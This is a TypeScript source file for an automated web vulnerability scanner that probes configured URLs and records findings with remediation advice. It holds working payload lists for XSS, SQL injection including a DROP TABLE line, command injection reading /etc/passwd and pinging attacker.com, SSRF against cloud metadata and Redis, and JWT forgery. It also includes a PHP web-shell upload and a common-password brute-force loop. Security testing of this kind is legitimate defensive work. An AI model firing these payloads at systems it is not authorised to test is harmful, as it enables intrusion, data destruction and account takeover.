import { SecurityAuditor } from '../types/SecurityTypes';
import crypto from 'crypto';

export interface PenetrationTestConfig {
    tests: PenetrationTestType[];
    targetUrls: string[];
    excludedUrls: string[];
    maxDepth: number;
    maxRequests: number;
    timeout: number;
    headers: Record<string, string>;
    authentication?: {
        type: 'basic' | 'bearer' | 'oauth2';
        credentials: Record<string, string>;
    };
}

export type PenetrationTestType =
    | 'xss'
    | 'sql-injection'
    | 'nosql-injection'
    | 'path-traversal'
    | 'command-injection'
    | 'ssrf'
    | 'csrf'
    | 'open-redirect'
    | 'file-upload'
    | 'rate-limit'
    | 'brute-force'
    | 'jwt'
    | 'cors';

export interface Vulnerability {
    type: PenetrationTestType;
    severity: 'low' | 'medium' | 'high' | 'critical';
    description: string;
    url: string;
    payload?: string;
    evidence?: string;
    recommendation?: string;
}

export interface PenetrationTestResult {
    testType: PenetrationTestType;
    target: string;
    success: boolean;
    vulnerabilities: Vulnerability[];
    timestamp: number;
    duration: number;
    requestsSent: number;
}

export interface TestResponse {
    status: number;
    headers: Record<string, string>;
    body?: unknown;
}

export interface FileUploadTest {
    name: string;
    content: string;
    type: string;
}

// Extension de SecurityAuditor avec la méthode logVulnerability
interface SecurityPenetrationAuditor extends SecurityAuditor {
    logVulnerability(data: {
        timestamp: number;
        vulnerabilities: Vulnerability[];
        target: string;
    }): Promise<void>;
}

export class SecurityPenetrationTester {
    private visited = new Set<string>();
    private requestCount = 0;

    constructor(
        private readonly config: PenetrationTestConfig,
        private readonly securityAuditor: SecurityPenetrationAuditor
    ) { }

    // Run all tests
    public async runTests(): Promise<PenetrationTestResult[]> {
        const results: PenetrationTestResult[] = [];

        for (const targetUrl of this.config.targetUrls) {
            if (this.shouldSkipUrl(targetUrl)) continue;

            for (const testType of this.config.tests) {
                const startTime = Date.now();
                try {
                    const result = await this.runTest(testType, targetUrl);
                    result.duration = Date.now() - startTime;
                    results.push(result);

                    if (result.vulnerabilities.length > 0) {
                        await this.securityAuditor.logVulnerability({
                            timestamp: Date.now(),
                            vulnerabilities: result.vulnerabilities,
                            target: targetUrl
                        });
                    }
                } catch (error) {
                    console.error(`Test failed for ${targetUrl}: ${error instanceof Error ? error.message : String(error)}`);
                }
            }
        }

        return results;
    }

    private async testBruteForce(url: string, result: PenetrationTestResult): Promise<void> {
        const commonUsernames = [
            'admin',
            'root',
            'administrator',
            'user',
            'test'
        ];

        const commonPasswords = [
            'password',
            '123456',
            'admin',
            'root',
            'password123',
            'test'
        ];

        for (const username of commonUsernames) {
            if (this.requestCount >= this.config.maxRequests) break;

            for (const password of commonPasswords) {
                const response = await this.sendRequest(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        ...this.config.headers
                    },
                    body: JSON.stringify({ username, password })
                });

                if (this.detectSuccessfulAuth(response)) {
                    this.addVulnerability(result, {
                        type: 'brute-force',
                        severity: 'critical',
                        description: 'Successful authentication with common credentials',
                        url,
                        payload: `${username}:${password}`,
                        recommendation: 'Implement account lockout, rate limiting, and require strong passwords'
                    });
                    return;
                }
            }
        }
    }

    // Core test runner
    private async runTest(type: PenetrationTestType, url: string): Promise<PenetrationTestResult> {
        const result: PenetrationTestResult = {
            testType: type,
            target: url,
            success: false,
            vulnerabilities: [],
            timestamp: Date.now(),
            duration: 0,
            requestsSent: 0
        };

        try {
            switch (type) {
                case 'xss':
                    await this.testXSS(url, result);
                    break;
                case 'sql-injection':
                    await this.testSQLInjection(url, result);
                    break;
                case 'nosql-injection':
                    await this.testNoSQLInjection(url, result);
                    break;
                case 'path-traversal':
                    await this.testPathTraversal(url, result);
                    break;
                case 'command-injection':
                    await this.testCommandInjection(url, result);
                    break;
                case 'ssrf':
                    await this.testSSRF(url, result);
                    break;
                case 'csrf':
                    await this.testCSRF(url, result);
                    break;
                case 'open-redirect':
                    await this.testOpenRedirect(url, result);
                    break;
                case 'file-upload':
                    await this.testFileUpload(url, result);
                    break;
                case 'rate-limit':
                    await this.testRateLimit(url, result);
                    break;
                case 'brute-force':
                    await this.testBruteForce(url, result);
                    break;
                case 'jwt':
                    await this.testJWT(url, result);
                    break;
                case 'cors':
                    await this.testCORS(url, result);
                    break;
            }

            result.success = true;
        } catch (error) {
            result.success = false;
            this.addVulnerability(result, {
                type,
                severity: 'high',
                description: `Test failed: ${error instanceof Error ? error.message : String(error)}`,
                url
            });
        }

        return result;
    }

    // Individual test implementations
    private async testXSS(url: string, result: PenetrationTestResult): Promise<void> {
        const payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '"><svg/onload=alert(1)>',
            "javascript:alert(1)//"
        ];

        for (const payload of payloads) {
            const response = await this.sendRequest(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    ...this.config.headers
                },
                body: JSON.stringify({ input: payload })
            });

            if (this.detectXSSVulnerability(response)) {
                this.addVulnerability(result, {
                    type: 'xss',
                    severity: 'high',
                    description: 'XSS vulnerability detected',
                    url,
                    payload,
                    recommendation: 'Implement proper input sanitization and CSP'
                });
            }
        }
    }

    private async testSQLInjection(url: string, result: PenetrationTestResult): Promise<void> {
        const payloads = [
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "1 UNION SELECT null, username, password FROM users--",
            "1) UNION SELECT null, table_name FROM information_schema.tables--",
            "admin'--"
        ];

        for (const payload of payloads) {
            const response = await this.sendRequest(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    ...this.config.headers
                },
                body: JSON.stringify({ input: payload })
            });

            if (this.detectSQLInjectionVulnerability(response)) {
                this.addVulnerability(result, {
                    type: 'sql-injection',
                    severity: 'critical',
                    description: 'SQL Injection vulnerability detected',
                    url,
                    payload,
                    recommendation: 'Use parameterized queries or ORM'
                });
            }
        }
    }

    private async testNoSQLInjection(url: string, result: PenetrationTestResult): Promise<void> {
        const payloads = [
            { "$gt": "" },
            { "$ne": null },
            { "$where": "this.password.length > 0" },
            { "$regex": ".*" },
            { "$exists": true }
        ];

        for (const payload of payloads) {
            const response = await this.sendRequest(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    ...this.config.headers
                },
                body: JSON.stringify({ query: payload })
            });

            if (this.detectNoSQLInjectionVulnerability(response)) {
                this.addVulnerability(result, {
                    type: 'nosql-injection',
                    severity: 'critical',
                    description: 'NoSQL Injection vulnerability detected',
                    url,
                    payload: JSON.stringify(payload),
                    recommendation: 'Validate and sanitize user input'
                });
            }
        }
    }

    private async testPathTraversal(url: string, result: PenetrationTestResult): Promise<void> {
        const payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ];

        for (const payload of payloads) {
            const response = await this.sendRequest(`${url}?file=${payload}`, {
                method: 'GET',
                headers: this.config.headers
            });

            if (this.detectPathTraversalVulnerability(response)) {
                this.addVulnerability(result, {
                    type: 'path-traversal',
                    severity: 'high',
                    description: 'Path Traversal vulnerability detected',
                    url,
                    payload,
                    recommendation: 'Validate file paths, use proper permissions'
                });
            }
        }
    }

    private async testCommandInjection(url: string, result: PenetrationTestResult): Promise<void> {
        const payloads = [
            "; cat /etc/passwd",
            "| dir",
            "; ping -c 4 attacker.com",
            "\\n/usr/bin/id\\n",
            "$(whoami)"
        ];

        for (const payload of payloads) {
            const response = await this.sendRequest(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    ...this.config.headers
                },
                body: JSON.stringify({ command: payload })
            });

            if (this.detectCommandInjectionVulnerability(response)) {
                this.addVulnerability(result, {
                    type: 'command-injection',
                    severity: 'critical',
                    description: 'Command Injection vulnerability detected',
                    url,
                    payload,
                    recommendation: 'Never execute system commands with user input'
                });
            }
        }
    }

    private async testSSRF(url: string, result: PenetrationTestResult): Promise<void> {
        const payloads = [
            "http://localhost/",
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:22",
            "gopher://127.0.0.1:6379/_FLUSHALL"
        ];

        for (const payload of payloads) {
            const response = await this.sendRequest(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    ...this.config.headers
                },
                body: JSON.stringify({ url: payload })
            });

            if (this.detectSSRFVulnerability(response)) {
                this.addVulnerability(result, {
                    type: 'ssrf',
                    severity: 'high',
                    description: 'SSRF vulnerability detected',
                    url,
                    payload,
                    recommendation: 'Validate and whitelist allowed URLs/domains'
                });
            }
        }
    }

    private async testCSRF(url: string, result: PenetrationTestResult): Promise<void> {
        // Test sans token CSRF
        const response1 = await this.sendRequest(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                ...this.config.headers
            },
            body: JSON.stringify({ test: 'data' })
        });

        // Test avec Origine différente
        const response2 = await this.sendRequest(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Origin': 'https://evil.com',
                ...this.config.headers
            },
            body: JSON.stringify({ test: 'data' })
        });

        if (this.detectCSRFVulnerability(response1) || this.detectCSRFVulnerability(response2)) {
            this.addVulnerability(result, {
                type: 'csrf',
                severity: 'high',
                description: 'CSRF protection not properly implemented',
                url,
                recommendation: 'Implement CSRF tokens and validate Origin/Referer headers'
            });
        }
    }

    private async testOpenRedirect(url: string, result: PenetrationTestResult): Promise<void> {
        const redirectTargets = [
            'https://evil.com',
            '//evil.com',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            '\\\\evil.com'
        ];

        for (const target of redirectTargets) {
            const testUrl = `${url}?redirect=${encodeURIComponent(target)}`;
            const response = await this.sendRequest(testUrl, {
                method: 'GET',
                headers: this.config.headers,
                redirect: 'manual'
            });

            if (this.detectOpenRedirectVulnerability(response, target)) {
                this.addVulnerability(result, {
                    type: 'open-redirect',
                    severity: 'medium',
                    description: 'Open redirect vulnerability',
                    url: testUrl,
                    payload: target,
                    recommendation: 'Validate and whitelist redirect URLs'
                });
            }
        }
    }

    private async testFileUpload(url: string, result: PenetrationTestResult): Promise<void> {
        const maliciousFiles: FileUploadTest[] = [
            {
                name: 'test.php',
                content: '<?php system($_GET["cmd"]); ?>',
                type: 'application/x-php'
            },
            {
                name: 'test.js',
                content: 'process.env.SECRET',
                type: 'application/javascript'
            },
            {
                name: '../../../etc/passwd',
                content: 'test',
                type: 'text/plain'
            }
        ];

        for (const file of maliciousFiles) {
            const formData = new FormData();
            formData.append('file', new Blob([file.content], { type: file.type }), file.name);

            const response = await this.sendRequest(url, {
                method: 'POST',
                headers: this.config.headers,
                body: formData
            });

            if (this.detectFileUploadVulnerability(response, file)) {
                this.addVulnerability(result, {
                    type: 'file-upload',
                    severity: 'high',
                    description: 'Dangerous file upload vulnerability',
                    url,
                    payload: file.name,
                    recommendation: 'Implement proper file type validation'
                });
            }
        }
    }

    private async testRateLimit(url: string, result: PenetrationTestResult): Promise<void> {
        const maxRequests = 50;
        const timeWindow = 10000; // 10 seconds
        const startTime = Date.now();

        let requestCount = 0;
        let successfulRequests = 0;

        while (requestCount < maxRequests && (Date.now() - startTime) < timeWindow) {
            try {
                const response = await this.sendRequest(url, {
                    method: 'GET',
                    headers: this.config.headers
                });

                if (response.status === 200) {
                    successfulRequests++;
                }
                requestCount++;
            } catch {
                break;
            }
        }

        if (successfulRequests > maxRequests * 0.8) { // Plus de 80% de réussite
            this.addVulnerability(result, {
                type: 'rate-limit',
                severity: 'medium',
                description: 'Rate limiting not properly implemented',
                url,
                evidence: `${successfulRequests}/${requestCount} successful requests in ${timeWindow}ms`,
                recommendation: 'Implement proper rate limiting'
            });
        }
    }

    private async testJWT(url: string, result: PenetrationTestResult): Promise<void> {
        // Test with 'none' algorithm
        const noneToken = this.createJWTToken({ alg: 'none' }, { admin: true });
        const response1 = await this.sendRequest(url, {
            method: 'GET',
            headers: {
                ...this.config.headers,
                'Authorization': `Bearer ${noneToken}`
            }
        });

        // Test with weak secret
        const weakToken = this.createJWTToken({ alg: 'HS256' }, { admin: true }, 'secret');
        const response2 = await this.sendRequest(url, {
            method: 'GET',
            headers: {
                ...this.config.headers,
                'Authorization': `Bearer ${weakToken}`
            }
        });

        if (response1.status === 200 || response2.status === 200) {
            this.addVulnerability(result, {
                type: 'jwt',
                severity: 'high',
                description: 'JWT validation vulnerability detected',
                url,
                payload: response1.status === 200 ? noneToken : weakToken,
                recommendation: 'Implement proper JWT validation and signature verification'
            });
        }
    }

    private async testCORS(url: string, result: PenetrationTestResult): Promise<void> {
        const origins = [
            'http://evil.com',
            'http://localhost:8080',
            'null',
            '*'
        ];

        for (const origin of origins) {
            const response = await this.sendRequest(url, {
                method: 'OPTIONS',
                headers: {
                    ...this.config.headers,
                    'Origin': origin
                }
            });

            const allowOrigin = response.headers['access-control-allow-origin'];
            const allowCredentials = response.headers['access-control-allow-credentials'];

            if (allowOrigin === '*' || allowOrigin === 'null' ||
                (allowOrigin === origin && allowCredentials === 'true')) {
                this.addVulnerability(result, {
                    type: 'cors',
                    severity: 'medium',
                    description: 'Insecure CORS configuration detected',
                    url,
                    evidence: `allow-origin: ${allowOrigin}, allow-credentials: ${allowCredentials}`,
                    recommendation: 'Configure CORS policies properly'
                });
            }
        }
    }

    // Utility methods
    private shouldSkipUrl(url: string): boolean {
        return (
            this.config.excludedUrls.includes(url) ||
            this.visited.has(url) ||
            this.requestCount >= this.config.maxRequests
        );
    }

    private addVulnerability(result: PenetrationTestResult, vulnerability: Vulnerability): void {
        result.vulnerabilities.push(vulnerability);
    }

    private async sendRequest(url: string, options: RequestInit): Promise<TestResponse> {
        if (this.requestCount >= this.config.maxRequests) {
            throw new Error('Max requests limit reached');
        }

        this.requestCount++;
        this.visited.add(url);

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), this.config.timeout);

        try {
            const response = await fetch(url, {
                ...options,
                signal: controller.signal
            });

            const headers: Record<string, string> = {};
            response.headers.forEach((value, key) => {
                headers[key.toLowerCase()] = value;
            });

            return {
                status: response.status,
                headers,
                body: await response.json().catch(() => undefined)
            };
        } finally {
            clearTimeout(timeoutId);
        }
    }

    // Detection methods
    private detectXSSVulnerability(response: TestResponse): boolean {
        const responseText = JSON.stringify(response);
        const responseHeaders = response.headers || {};
        const contentType = responseHeaders['content-type'] || '';

        if (!contentType.includes('html') && !contentType.includes('json')) {
            return false;
        }

        const xssPatterns = [
            /<script>.*<\/script>/i,
            /on\w+\s*=\s*["'].*["']/i,
            /javascript:\s*\w+/i,
            /<img[^>]+src=[^>]+onerror=[^>]+>/i,
            /<svg[^>]+onload=[^>]+>/i,
            /data:text\/html.*base64/i
        ];

        return xssPatterns.some(pattern => pattern.test(responseText));
    }

    private detectSQLInjectionVulnerability(response: TestResponse): boolean {
        const responseText = JSON.stringify(response);

        const sqlErrorPatterns = [
            /SQL syntax.*MySQL/i,
            /Warning.*mysql_.*$/i,
            /SQLite\/JDBCDriver/i,
            /PostgreSQL.*ERROR/i,
            /ORA-[0-9][0-9][0-9][0-9]/i,
            /Microsoft SQL Native Client error/i
        ];

        return sqlErrorPatterns.some(pattern => pattern.test(responseText));
    }

    private detectNoSQLInjectionVulnerability(response: TestResponse): boolean {
        const responseText = JSON.stringify(response);

        const nosqlErrorPatterns = [
            /MongoError:/i,
            /BulkWriteError:/i,
            /CouchDB Error:/i,
            /ArangoError:/i,
            /Neo4jError:/i
        ];

        return nosqlErrorPatterns.some(pattern => pattern.test(responseText));
    }

    private detectPathTraversalVulnerability(response: TestResponse): boolean {
        const responseText = JSON.stringify(response);
        return /root:.*:0:0/.test(responseText) ||
            /\[boot loader\]/.test(responseText) ||
            /\[system\]/.test(responseText);
    }

    private detectCommandInjectionVulnerability(response: TestResponse): boolean {
        const responseText = JSON.stringify(response);
        return /uid=\d+\([\w_]+\)/.test(responseText) ||
            /Directory of/.test(responseText) ||
            /([1-9]|[1-9][0-9]|100)% packet loss/.test(responseText);
    }

    private detectSSRFVulnerability(response: TestResponse): boolean {
        const responseText = JSON.stringify(response);
        return /ami-[a-f0-9]{8}/.test(responseText) ||
            /docker/.test(responseText) ||
            /SSH-2.0/.test(responseText) ||
            /REDIS/.test(responseText);
    }

    private detectCSRFVulnerability(response: TestResponse): boolean {
        const headers = response.headers || {};
        return !(
            headers['x-csrf-token'] ||
            headers['csrf-token'] ||
            headers['xsrf-token'] ||
            headers['x-xsrf-token']
        );
    }

    private detectOpenRedirectVulnerability(response: TestResponse, target: string): boolean {
        const location = response.headers?.location;
        return Boolean(location && (location.includes(target) || location.startsWith(target)));
    }

    private detectFileUploadVulnerability(response: TestResponse, file: FileUploadTest): boolean {
        const responseText = JSON.stringify(response);

        const successPatterns = [
            /file uploaded successfully/i,
            /upload complete/i,
            new RegExp(`${file.name}.*saved`, 'i'),
            /filepath/i
        ];

        return successPatterns.some(pattern => pattern.test(responseText));
    }

    private detectSuccessfulAuth(response: TestResponse): boolean {
        const responseText = JSON.stringify(response);

        const successPatterns = [
            /"authenticated"\s*:\s*true/i,
            /"success"\s*:\s*true/i,
            /"token"\s*:/i,
            /"session"\s*:/i,
            /login successful/i,
            /welcome back/i
        ];

        return successPatterns.some(pattern => pattern.test(responseText));
    }

    private createJWTToken(header: Record<string, unknown>, payload: Record<string, unknown>, secret = ''): string {
        const encodeSegment = (obj: Record<string, unknown>) =>
            Buffer.from(JSON.stringify(obj)).toString('base64url');

        const encodedHeader = encodeSegment(header);
        const encodedPayload = encodeSegment(payload);

        if (header.alg === 'none') {
            return `${encodedHeader}.${encodedPayload}.`;
        }

        const signature = this.signJWT(`${encodedHeader}.${encodedPayload}`, secret);
        return `${encodedHeader}.${encodedPayload}.${signature}`;
    }

    private signJWT(input: string, secret: string): string {
        return crypto
            .createHmac('sha256', secret)
            .update(input)
            .digest('base64url');
    }
}